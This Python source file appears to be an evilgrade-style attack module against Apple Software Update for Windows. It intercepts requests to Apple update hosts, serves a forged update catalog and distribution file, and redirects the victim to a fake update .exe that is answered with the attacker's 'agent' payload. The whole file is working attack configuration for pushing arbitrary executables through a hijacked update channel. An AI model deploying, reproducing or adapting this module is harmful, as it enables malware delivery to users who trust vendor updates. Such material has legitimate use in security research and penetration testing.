from modules import ModuleBase


class AppleUpdate(ModuleBase):
    name = 'Apple Windows Update Software'
    version = '1.0'
    appver = ' < 2.1.2 (<= Safari 5.0.2 7533.18.5, <= Itunes 10.0.1.22, <= Quicktime 7.6.8 1675)'
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com>']
    description = ''
    vh = '(swcatalog.apple.com|swcdn.apple.com|itunes.com|swscan.apple.com)'
    options = {
        'rnd': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [{
            'path': '\.sucatalog$',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/appleupdate/appleupdate_catalog.xml'
        }, {
            'path': '061-4339.Spanish.dist',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/appleupdate/061-4339.Spanish.dist'
        }, {
            'path': '.dist',
            'type': 'file',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': './include/appleupdate/061-4339.Spanish.dist'
        }, {
            'path': '/closed.html',            #regex anything
            'type': 'redirect',
            'location': 'http://swcatalog.apple.com/update<%RND%>.exe',
            'method': '',
            'bin': '',
            'string': '',
            'parse': '1',
            'file': '',
        }, {
            'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }]
